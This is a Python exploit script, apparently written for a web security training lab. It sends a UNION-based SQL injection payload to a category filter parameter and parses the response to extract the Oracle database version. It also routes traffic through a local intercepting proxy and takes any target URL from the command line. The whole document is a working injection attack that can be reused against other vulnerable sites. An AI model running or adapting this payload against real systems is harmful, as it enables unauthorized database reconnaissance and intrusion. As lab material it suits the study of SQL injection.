import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_version(url):
    path = "/filter?category=Lifestyle"
    sqli_payload = "' UNION SELECT banner,NULL FROM v$version--"
    res = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    if "Oracle Database" in res.text:
        print("[+] Found the Oracle Database Version!")
        # extract results and output to user
        soup = BeautifulSoup(res.text, 'html.parser')
        version = soup.find(string=re.compile(".*Oracle\sDatabase.*")) # find the string that is returned by the Regex pattern
        # TIP: You can go to regex101.com to check if your Regex is correct or not
        print("[+] The Oracle database version is: " + version)
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        # assume we know the # of columns and which columns we can use to output content from the DB
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s "<url>"' % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        exit()
    
    print("[+] Dumping the version of the database...")

    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version.")